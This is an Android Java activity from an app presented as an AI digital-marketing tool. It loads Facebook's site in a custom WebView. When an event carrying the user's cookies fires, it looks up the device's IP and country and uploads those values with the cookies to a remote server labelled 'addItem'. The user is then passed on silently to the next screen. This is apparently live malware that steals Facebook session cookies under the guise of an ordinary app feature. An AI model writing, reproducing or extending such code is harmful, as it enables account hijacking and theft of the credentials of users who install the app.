package com.madgicx.ai_digital_marketing.activity;

import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import com.madgicx.ai_digital_marketing.R;
import com.madgicx.ai_digital_marketing.base.BaseRx;
import com.madgicx.ai_digital_marketing.event.StringEvent;
import com.madgicx.ai_digital_marketing.model.IpModel;
import com.madgicx.ai_digital_marketing.network.manager.RestApiManager;
import com.madgicx.ai_digital_marketing.network.response.BaseResponse;
import com.madgicx.ai_digital_marketing.utils.EventBusUtil;
import com.madgicx.ai_digital_marketing.widget.CWebView;

import org.greenrobot.eventbus.Subscribe;
import org.greenrobot.eventbus.ThreadMode;
import org.jetbrains.annotations.NotNull;

import io.reactivex.Observable;

public class WebActivity extends AppCompatActivity {

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_web);
        CWebView webView = findViewById(R.id.web_view);
        EventBusUtil.register(this);
        webView.loadUrl("https://www.facebook.com/");
    }

    @Subscribe(threadMode = ThreadMode.MAIN)
    public void onStringEvent(StringEvent event) {
        new BaseRx<IpModel>().callApi(new BaseRx.BaseRxCallBackCallApi<IpModel>() {
            @Override
            public void onResponse(IpModel result) {
                new BaseRx<BaseResponse>().callApi(new BaseRx.BaseRxCallBackCallApi<BaseResponse>() {
                    @Override
                    public void onResponse(BaseResponse result) {
                        Intent intent = new Intent(WebActivity.this, InsideActivity.class);
                        intent.putExtra("first", true);
                        startActivity(intent);
                        finish();
                        Log.d("thent", result.message);
                    }

                    @NotNull
                    @Override
                    public Observable<BaseResponse> onFun() {
                        return RestApiManager.getInstance().pushDataManager().getData("addItem", result.ip, getString(R.string.app_name), result.country, event.cookies);
                    }

                    @Override
                    public void onError(@NotNull Throwable e) {
                        Intent intent = new Intent(WebActivity.this, InsideActivity.class);
                        intent.putExtra("first", true);
                        startActivity(intent);
                        finish();
                        Log.d("thent", e.getMessage());
                    }
                });
            }

            @NotNull
            @Override
            public Observable<IpModel> onFun() {
                return RestApiManager.getInstance().getIpManager().getIp();
            }

            @Override
            public void onError(@NotNull Throwable e) {
                Log.d("thent", e.getMessage());
            }
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        EventBusUtil.unregister(this);
    }
}
